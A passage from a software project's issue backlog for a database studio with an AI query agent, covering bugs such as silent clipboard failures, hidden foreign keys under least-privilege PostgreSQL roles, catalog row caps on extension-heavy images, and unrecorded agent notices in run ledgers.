A contributor's first `bun dev` is a dead end unless they already hold a session cookie from a
production run, which is why this has gone unnoticed.

Production is unaffected and nothing here argues for weakening the shipped policy. The fix is to relax
the directive only where `NODE_ENV === "development"`, in one place, with the reason written next to it.

**Done when:** `bun dev` can log in from a cold browser profile, with a test asserting the shipped
policy still omits `unsafe-eval`.

### B41. `defaults` in a seed config does not merge `roles`

`docs/SEED_CONNECTIONS.md` says the `defaults` block is "merged into every connection". A config whose
`roles` appears only under `defaults` is rejected with
`Invalid seed config: connections.0.roles: expected array, received undefined`.

`mergeDefaults` (`src/lib/seed/connection-filter.ts`) merges `managed`, `environment` and `ssl`, and
nothing else. The values table in that doc lists only those three, so the schema and the table agree —
it is the prose ("merged into every connection") that overstates. A config file is not the place to
find that out by experiment.

**Done when:** the documented behaviour and the schema agree, whichever way is chosen, with a test
covering a config that sets `roles` only in `defaults`.

### B43. Nine copy call sites outside the agent rail fail silently on plain HTTP

`navigator.clipboard` is a secure-context API: over plain HTTP on any host but loopback it is
`undefined`, and this product ships that way on several distribution channels. Same trap already
recorded for `crypto.randomUUID` in `use-query-execution.ts`.

`src/components/copy-button.tsx` (#389) handles it by falling back to `document.execCommand("copy")` and
reporting a failure of both, but it is used only by the agent rail. Every other copy reaches the API
unguarded — nine call sites across seven components: `TableItem.tsx`, `RowDetailSheet.tsx` (three: one
per field, two on the whole-row path), `CodeGenerator.tsx`, `TestDataGenerator.tsx`,
`DataImportModal.tsx`, `StudioMobileHeader.tsx` and `QueryEditor.tsx`.

Four of the seven claim a success nobody observed, in the same statement that starts the write:
`CodeGenerator`, `TestDataGenerator` and `RowDetailSheet` flip a label, and `TableItem` raises a
`toast.success`. On those channels the user is told the copy worked and finds out when they paste.

**Done when:** every copy goes through `CopyButton` (or its `writeToClipboard`), with a test per site
that the label does not claim success when the write was refused.

### B44. The documented least-privilege role sees no foreign key, and the run asserts none exists

Found on 2026-08-17 while re-driving `docs/AGENT_DEMO.md` in a browser. Two halves, and the second is
the one that reaches a user.

**The read comes back empty.** `composePostgresRelations` reads
`information_schema.table_constraints` / `key_column_usage` / `constraint_column_usage`. PostgreSQL
restricts those views to constraints on tables the current role owns or holds a privilege on *other
than* `SELECT`. So the role `docs/AGENT_DEMO.md` prescribes — `CONNECT`, `USAGE`, `SELECT ON ALL
TABLES`, `pg_read_all_stats` — sees none of them.

Measured on the seeded dvdrental as `libredb_agent` (`usesuper = f`):
`information_schema.table_constraints` returns **0** rows with `constraint_type = 'FOREIGN KEY'`, while
`pg_constraint WHERE contype = 'f'` holds **18**. The relations graph packed into the run's context is
empty for the exact role the product tells operators to create.

**The run then asserts the negative.** Asked what tables exist and how they relate, an investigation run
answered *"There are no declared foreign key constraints between tables in the database"* — false, and
cited to a schema snapshot that genuinely contained nothing. A zero-row relations read cannot
distinguish "this database declares no foreign keys" from "this role cannot see the ones it declares",
and nothing today makes the run say which it means. The neighbouring case survived only because the
model reconstructed the join path from column names, which is luck, not evidence.

The first half is **B8's rewrite arriving for a second reason.** `pg_constraint` is readable by any role
with `USAGE` on the schema, so that same rewrite closes this too.

The second half is a separate decision and does not go away with the rewrite, since any role can be
narrower than the database.

**Done when:** a run on a `SELECT`-only role reports this database's foreign keys, **and** an empty
relations read no longer licenses "there are no foreign keys" — the run either says it could not see them
or says nothing about them, with a test that pins the distinction.

### B45. Every optimization run is scored `unanswered`, including one that produced a correct index

Driven live on 2026-08-17. A query-optimization run compared plans with real PostgreSQL costs,
recommended a `CREATE INDEX` that is the right index, offered it to the editor — and ended *"Run did not
answer — Every result the report cited came back empty, so the answer rests on nothing."* Every Optimize
run in that drive ended the same way.

Two mechanisms compose into it. The plan artifact a run cites is `sql.explain.estimate`, and a plan
arrives in a single column, so the artifact's summary records `rowCount: 0` — the artifact is complete
and its row count is meaningless. And `verifyOptimizationGoal` composes on the investigation baseline,
which carries the `empty-evidence` arm: every cited result returning zero rows ends the run unanswered.

**This is structurally the same error the operations template was explicitly exempted from, and the
exemption's own rationale applies verbatim.** `src/lib/agent/goal-verifier.ts` argues that holding an
operational reading to the emptiness rule is "precisely backwards" — "no session is blocked" and "no
index is unused" are answers, and marking a healthy server's run unanswered is "the same error as
demanding an artifact only some valid answers can produce". A plan with zero rows in it is the same
shape: emptiness is a property of how a plan is returned, not of whether the question was answered.

The cost is worse than a wrong label, because the verdict is the part of a run a sceptical reader trusts
most: the product contradicts its own good answer, in its own voice, at the end of the run.

**Done when:** an optimization run whose report cites a plan and recommends an index is scored
`answered` — either by exempting `sql.explain.estimate` from the emptiness arm or by not composing that
arm into this template — with an eval that fails if the run above reads `unanswered`, and with the reason
recorded next to the operations exemption so the two read as one decision.

### B47. `engine-unsupported` is shown for a misconfigured agent credential, on an engine that is supported

`AgentRunFailureReason`'s `engine-unsupported` is rendered as *"The agent cannot run on this database
engine: it offers no read-only execution profile."* It is the classification `runtime.ts` gives to any
`ExecutionProfileError`, and that error has two causes rather than one.

The engine-shaped cause fits the sentence: `acquireExecutionProfileProvider` refuses `agent-read-only`
for a provider with no `queryReadOnly`.

The other cause is `resolveAgentCredential`, which throws the same error type — with reason codes
`AGENT_CREDENTIAL_UNRESOLVABLE` and `AGENT_CREDENTIAL_WITH_CONNECTION_STRING` — for a credential that is
half-configured, sealed under a key that no longer decrypts, or configured alongside a connection
string. That check runs before a provider is created, on every engine.

So an operator who set `agentUser` and `agentPassword` on a PostgreSQL connection and then rotated the
secret key is told their engine is unsupported. The one message they get points away from the one thing
they could fix, and says something about their database that is false.

Not made by #411 and not fixed by it. Every workflow could already reach it through
`acquireExecutionProfileProvider` on the reading path. What #411 changed is that an `operations` run can
now reach it before its first turn, during the grounding capture — the earliest and least explicable
moment for it to arrive.

**Done when:** a credential refusal is classified apart from an engine refusal. The reason codes already
distinguish them, so this is a branch in `classifyDriveFailure` and a second rail sentence, with a test
per cause pinning the sentence a user is shown.

### B48. The composed grounding path still loses a plan run to an environment failure

`captureFromProvider` (`src/lib/agent/context-snapshot.ts`) converts a `DatabaseError` or an
`ExecutionProfileError` raised before the reading leaves into an unavailable capture. So a plan run on
one of the nine provider-path engines survives an unreachable host, a wrong password or a
half-configured `agentUser`, and answers ungrounded with the capture's own diagnosis.

The composed path — PostgreSQL and SQLite — does not. The same failure propagates out of
`readCatalogForGrounding`, through `captureContextSnapshot` and `establishPlanningContext`, and ends the
run `internal`, or `engine-unsupported` on the profile error (see B47).

The asymmetry was deliberate at #414: those two engines have never reached the new line, and changing
their failure mode is a second decision about a path #414 did not touch. It is still an asymmetry a
reader will trip over.

**Done when:** both grounding paths answer an environment failure the same way.

### B49. A LibreDB connection can never be grounded, because the file takes an exclusive lock

- `lib.open({ path })` takes an **exclusive lock**. Opening the same path a second time in the same
  process throws `LibreDbError` with `code: "LOCKED"`.
- `acquireExecutionProfileProvider(connection, "agent-operations")` is a **second provider**, cached
  under `profiledCacheKey(connection.id, profile)` rather than under the connection id, and it calls
  `connect()` — which is `lib.open()` on a path the ordinary writable provider already holds open.
- Driven end to end: with the writable provider connected and returning five namespaces (`config:*`,
  `people:*`, `project:*`, `users:*`, `session:*`), the profiled acquisition fails with
  `ConnectionError` / `CONNECTION_ERROR` and the message the provider writes for `LOCKED` — *"LibreDB
  file is already open by another process (exclusive lock)."*
- `ConnectionError` extends `DatabaseError`, so `captureFromProvider` converts it into an unavailable
  capture rather than propagating it. The run continues, honestly, ungrounded — which is why nothing
  about this looks like a failure anywhere.

The condition is "the connection's ordinary provider is currently connected", which is true from the
moment anyone browses the connection in the sidebar. So in practice this is every run.

It is not a grounding defect: the same lock defeats any second handle on the same file, which is why D3
records the connection-test modal presenting it as a failed connection. LibreDB is not a priority, so
this is recorded rather than fixed.

**Done when:** an execution-profile acquisition on a single-writer embedded engine reuses the
connection's existing provider instead of opening a second handle — the same answer D3 needs, and the
reason the two should be closed together — with a test that grounds a plan run on a `libredb` connection
whose writable provider is already open.

### B50. A grounded Redis plan still drafts `KEYS`, the one command this product refuses to use itself

Two plan runs on the seeded local Redis, driven after #414's vocabulary work landed, both grounded on
the same 17 real key prefixes the provider read:

- *"Which key prefix holds the most keys, and how would I list them?"* → **NO STATEMENT**, and the
  refusal is a good one: the inventory shows key patterns but no counts, so the question cannot be
  answered from it. Before the vocabulary fix the same objective produced `KEYS user:*` as an answer.
- *"How many users are stored, and how do I look one up?"* → drafted `KEYS user:*`, with a rationale
  that also named `HGETALL user:<id>` for the lookup.

Grounding is working, and the second half of that rationale is the new rule working as designed: it
names a WHOLE KEY rather than handing a derived grouping to a command. This is a draft-QUALITY matter,
not a grounding one, and should not be read as evidence against #414.

What is wrong is the first half. `KEYS` is the blocking O(N) command this product's own provider
deliberately refuses to use: the schema read is a non-blocking `SCAN` and never `KEYS *`
(`docs/providers/redis.md`, and `CLAUDE.md` states it as a rule). So the product reads the keyspace
safely, then offers the user the unsafe way to do the same thing — with an Apply-to-editor button on it.
Nothing runs: plan mode executes nothing and has no tools, so reaching the hazard takes the user
applying the draft and running it themselves.

**The open question.** The owner deliberately deferred per-engine knowledge files, and the
derived-groupings rule was written to stay on the near side of that line: it says what the inventory's
rows ARE and names no command, pinned by a test ("it names no command and forbids none").

- For a cost sentence: one sentence about operational COST is a different kind of statement from a ban
  on a named command, and it may belong in the rules.
- Against: a rule that bans one command by name is engine trivia that goes stale, says nothing about the
  next command, and this repository has been bitten by exactly that before. A model that knows what the
  rows are can choose for itself, which is the premise the whole grounding design rests on.
- Third position: this is the user's call. The draft is theirs to run, on their own connection, and a
  product that reads for them does not have to think for them.

**Update 2026-08-22.** The SHAPE half of this is fixed and is not what B50 is about: `redis.ts` now
declares a `statementLanguage`, because a plan run drafted `1) KEYS session:*` / `2) GET session:1` and
`executeRedisCommand` reads the whole body as one command, so the server answered `ERR unknown command
'1)'`. That sentence deliberately names no command and forbids none — it names the packaging (one
command, no numbering, no `redis-cli` prefix) and repeats what the rows ARE. The cost question below is
untouched by it and still the owner's.

**Done when:** the owner rules, and the reason is recorded next to the derived-groupings rule so the two
read as one decision.

### B51. The run loop nudges a model three times and records none of it

`runInvestigation` delivers three notices, each one-shot per DRIVE, each with its own boolean, guard set
and delivery mechanism:

| Notice | When | Delivered as |
| --- | --- | --- |
| `AGENT_REPORT_RESERVE_NOTICE` | within the turn or time reserve of a ceiling | a `user` message, riding the turn about to be taken |
| `AGENT_REPORT_REMINDER_NOTICE` | a prose turn after a tool this run holds was called | a `user` message, and the turn is taken again |
| `AGENT_PRESENT_BEFORE_REPORT_NOTICE` | a `compose_report` on an answering workflow with a presentable read and no presentation | a `tool` result, INSTEAD of running the call |

None of the three writes to the ledger. `service.recordEvent` is called for the schema capture, the
drafted statement, the closing prose, the recommendation, the answer and the report — and for nothing the
server said to the model. So a run's timeline shows a model that read, narrated and then reported, with
no entry saying it was told to report. And a `compose_report` the loop withheld leaves no record that a
call was made at all.

**"Once" means once per drive, and the missing entry is why.** All three booleans are `let`s inside
`runInvestigation`, and that function is what RESUMES an already-running run. A resumed drive starts with
every flag false and can deliver a notice the previous drive already delivered. Two of the three have a
partial durable guard by accident: the present-before-report notice reads `answer-composed` off the
ledger, so a run that presented is not told to again — but a run whose `present_answer` was REFUSED
writes no event, and is. Nothing bounds the report reminder or the reserve notice across a resume.

**That is a measurement problem before it is a design one.** `docs/llms/` is built by reading run
ledgers out of `.workflow-data`, and its whole claim is that each figure comes from an observed run.
After #416 and #417 a ledger can no longer answer "did this model do that by itself?" — the exact
question those pages exist to answer, and the question that decides whether a nudge is worth keeping.
`methodology.md` already warns that one run per cell is the weakest part of the method; an
unattributable rescue is weaker still, because re-running does not reveal it either.

**The second half is the shape.** Each notice's GUARDS are the load-bearing part, and the part that keeps
being got wrong. #416 arrived without the tool-set bound (a planning run, which holds no tools, was told
to call `compose_report`) and without the turn bound (a run narrating at the ceiling was turned from
`succeeded` / `model-stopped` into `failed` / `turn-limit`). #417 arrived with a condition that named "a
result this run can present" and read an operation id that `inspect_schema` shares. Both were caught in
review rather than by a gate, and a fourth notice will be written by someone reading the third.

**Done when:** a delivery is an entry on the ledger — one event kind, carrying which notice and what the
run had done when it arrived — read back at the head of a drive so a resumed run is not told twice, and
the three share one declared shape so a new one states its condition, scope and delivery in the same
place. Whether the rail SHOWS the entry is a separate question and probably a no: the notices exist to
be invisible to a user, and the timeline is not the same surface as the ledger.

### B52. The grounding capture's row cap is reached by what the image ships, not by a wide user schema

`composeCatalogRead` records a known limitation with a number: the PostgreSQL projection is one row per
COLUMN against `maxResultRows: 200`, so an unnarrowed call "overflows at roughly 25 tables of eight
columns". That estimate frames the cap as something a large user schema reaches. Three measurements say
otherwise.

**TimescaleDB — two user tables are enough.** Measured 2026-08-20 against
`timescale/timescaledb:latest-pg17` (2.29.2 on PostgreSQL 17.11). `information_schema.columns` outside
`pg_catalog` and `information_schema` answers **478 rows**, of which **473 belong to the extension** and
**5 are the user's**. The read is refused rather than truncated, by design, so the plan run answers
ungrounded with "This run was given no inventory of this database." The identical run against plain
PostgreSQL 18 captured "3 tables, fingerprint ctx_0d63" and named them. Granting the agent role USAGE
and SELECT on the internal schemas does not change the outcome, so this is the row cap and not a
privilege.

**Cloudberry — and it is not an extension.** Measured against `woblerr/cloudberry:2.1.0-incubating`
(PostgreSQL 14.4) with the same two user tables: `CATALOG_READ_REFUSED`, "289 rows > 200 allowed". **282
of those 289 belong to `gp_toolkit`.** The figure is per-role: the same read as `gpadmin` answers **481**
rows. Cloudberry is a PostgreSQL fork rather than a PostgreSQL carrying an extension, so what
generalises is narrower than the first measurement suggested — any PostgreSQL-wire server whose own
catalogs are wide before the user creates anything.

Cloudberry also fails one step earlier, which matters for anyone trying to work around this. Its usual
login is `gpadmin`, a superuser, and the agent's execution profile refuses that role as too broad. So
the row budget is only reached after a least-privilege `agentUser` has been created by hand — and it is
then reached anyway.

**AlloyDB Omni settles which fix is viable.** Measured against `google/alloydbomni:17.9.0` (PostgreSQL
17.9), same two user tables: `CATALOG_READ_REFUSED`, "536 rows > 200 allowed". Only **7 of the 536 are
the user's**. As the agent role sees it: `public` **348**, `google_ml` 144, `ai` 44 — and **341 of the
348 in `public` are the 49 extension views the image installs into `public` itself**.

That is what makes it decisive. On TimescaleDB and Cloudberry the overflow sits in a separate internal
schema, so the candidate fix "exclude the schemas the object browser already treats as internal" would
rescue both. Here it rescues nothing: narrowing to `schema=public` still refuses, at **348 rows against
200**. The only selector that fits is a single table (`schema=public table=orders` projects 4 rows),
which is not a schema capture at all.

**So of the two candidate fixes only one survives: aggregate columns per table so the projection is one
row per OBJECT, symmetric with the SQLite side. The schema-exclusion fix is refuted and should not be
attempted.**

Two controls keep the AlloyDB numbers attributable. Plain PostgreSQL 18.4, in the same pass, projects
**7 rows** and captures its 2 tables. And the `relations` capture kind projects 0 rows as the agent role
and 3 as a superuser on AlloyDB — but the plain PostgreSQL baseline behaves identically, so that is
PostgreSQL's own privilege rule (B44) and not an AlloyDB property.

AlloyDB Omni also fails the earlier step, for Cloudberry's reason: as the image's own `postgres`
superuser both profiles are refused with `PROFILE_PRIVILEGES_TOO_BROAD`. With a hand-made
least-privilege role both acquire and `queryReadOnly` is present, so the boundary works — and the capture
is refused anyway.

The consequence: the agent is unusable out of the box on TimescaleDB, Cloudberry and AlloyDB Omni, and
the same shape will appear on any PostgreSQL-wire server whose image ships wide catalogs or wide
extension views before the user creates anything.

**Done when:** a plan run against a stock TimescaleDB, one against a stock Cloudberry and one against a
stock AlloyDB Omni all report a captured schema naming the user's tables.

### B54. A refused grounding capture leaves no trace in the ledger, so B52 cannot be diagnosed from it

`docs/llms/setup.md` states the rule this breaks: "Every run writes its ledger to `.workflow-data`, and
that is the authority on what a run did."

For a capture that SUCCEEDS that is true — `investigation.ts` records a `context-captured` event carrying
the fingerprint, the table count and the whole snapshot. For a capture that is REFUSED it is not: the
`capture.kind === "unavailable"` branch pushes `planningUngroundedNote(...)` into the model's prompt and
returns without recording anything.

Measured 2026-08-20 against a live AlloyDB Omni 17.9.0, in the browser, with a least-privilege agent
role. Two ledgers side by side:

- **Vitess, capture succeeded:** `context-captured`, `fingerprint ctx_3ce059ca...`, `tableCount 2`, plus
  the full snapshot.
- **AlloyDB Omni, capture refused:** four events — `run-opened`, `run-started`, `closing-statement`,
  `run-finished` — and nothing between the second and the third. The 849-byte ledger names no catalog
  read, no reason code and no row count.

So the only record that the run was ungrounded is the model's own sentence, "This run was given no
inventory of this database". The reason — `CATALOG_READ_REFUSED`, 536 rows against a 200-row budget, 341
of them extension views in `public` — is computed in `context-snapshot.ts`, handed to the model, and then
dropped. It is not in the ledger and not in the server log either: grepping the run's own log for
`CATALOG_READ_REFUSED`, `row budget` and `536` finds nothing.

Worse than a gap in telemetry, because this repo has already recorded the trap it walks into: a missing
event reads as work that was not needed rather than knowledge that was lost. An operator diagnosing B52
today has to reproduce the run outside the product to learn why it had no schema.

Related: B13, where the capture's own SPEND is missing from the ledger for the same structural reason.

**Done when:** a refused capture records an event carrying its `reasonCode` and, where the reason is the
row budget, the two numbers — rows projected and rows allowed — and a plan run whose capture was refused
can be explained from its ledger alone.

### B55. A LibreDB plan run drafts `GET users:*`, a command that answers zero rows rather than failing

Measured 2026-08-22 on the embedded LibreDB sample, plan mode, objective *"list every entry under the
users prefix and read one user by key"*. The run was grounded — `context-captured`, three prefixes
(`articles:*`, `config:*`, `users:*`) — and drafted:

```libredb
GET users:*
```

`dispatchCommand` gives `get` exactly one meaning: `kv.get(parts[1])`, an exact-key lookup with no glob
of any kind. The key `users:*` does not exist, so the command returns **zero rows and no error** — the
same silently-wrong class as the MongoDB `$shipping.region` case, and harder to notice because an empty
result on a key-value store reads as "nothing stored there". The runnable form is `prefix users:`, which
is what `generateTableQuery` already emits for the same row when a person clicks it.

The cause is the one Redis has too: the inventory's rows are named `users:*`, which reads as a glob the
grammar does not have. Redis's half was fixed by declaring `ProviderLabels.statementLanguage`
(`redis.ts`); LibreDB declares none, so the plan contract tells the model only "this engine speaks no
SQL" and leaves the five verbs — `get`, `put`, `delete`, `prefix`, `range` — to be guessed.

Deferred by the owner on 2026-08-22, explicitly: LibreDB's agent and plan-mode behaviour waits until the
other providers are done. Recorded here so the deferral is a decision rather than an omission.

**Done when:** `LibreDbProvider.getLabels()` declares a `statementLanguage` that names the five verbs and
says a key is exact (no glob, no wildcard), with a test pinning it the way `mongodb.ts` and `redis.ts` are
pinned — and a live plan run on the embedded sample drafts `prefix users:` for this objective.

### B56. Plan grounding is held for the process lifetime, so a schema change is invisible until a restart

`holdSnapshotForConnection` keeps one inventory per connection identity in a bounded map with **no
expiry**: newest reading wins, eviction is by use, and nothing re-reads. `heldSnapshotForConnection` is
one of the three places a planning run's grounding comes from, and it is consulted before any capture.

Measured 2026-08-22, twice in one session. MongoDB's schema inference was changed to expand subdocuments
into dotted paths; `POST /api/db/schema/list` returned `shipping.city` immediately, and the schema tree
showed it. Two plan runs afterwards still grouped by `$shipping.region`, and their ledgers carry **no**
`context-captured` event at all — the hold answered, from an inventory read before the change. Restarting
the process fixed it on the first run: `context-captured` appeared and the draft named `$shipping.city`.

The same shape hit Redis: keys seeded into an empty database were invisible to a plan run until a restart,
which is what "NO STATEMENT: the `session:*` key pattern is not present in the inventory" meant — a
correct refusal against a stale inventory.

Two properties make this hard to see rather than merely stale. The hold has no TTL, so on a long-lived
server the window is unbounded; and B54's gap means a run that used the hold records nothing about where
its inventory came from, so the ledger cannot distinguish "held, hours old" from "captured just now".

The design intent is real and documented (`context-snapshot.ts`: a run reasons over the inventory its
claims cite, and a mid-run re-read would leave those claims describing a schema the report no longer
shows). What is not intended is that a NEW run inherits it indefinitely.

**Done when:** a new run's grounding is either re-captured or explicitly recorded as reused with the age
of the reading it reused, so a user who just added a collection is not silently planned against the
database as it was.

